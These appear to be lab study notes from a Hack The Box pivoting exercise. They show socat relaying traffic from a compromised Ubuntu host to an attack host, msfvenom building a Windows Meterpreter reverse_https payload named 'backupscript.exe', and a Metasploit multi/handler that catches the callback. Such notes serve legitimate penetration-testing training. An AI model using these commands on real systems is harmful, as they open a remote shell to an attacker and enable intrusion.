**What is Socat?**
- A bidirectional relay tool that can create pipe sockets between 2 independent network channels without needing to us SSH tunneling. 

**Starting a Socat Listener:**
```shell-session
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```
- Socat will listen on port 8080 and redirect traffic to port 80 on our attack host. 

**Creating a Windows Payload:**

```shell-session
realCustampin@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 743 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```
- Reminder that we still need to move this payload from our attack host to the windows target host. 

**Starting MSFConsole:**
```shell-session
realCustampin@htb[/htb]$ sudo msfconsole

<SNIP>
```

**Configuring multi/handler**
```shell-session
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
lport => 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```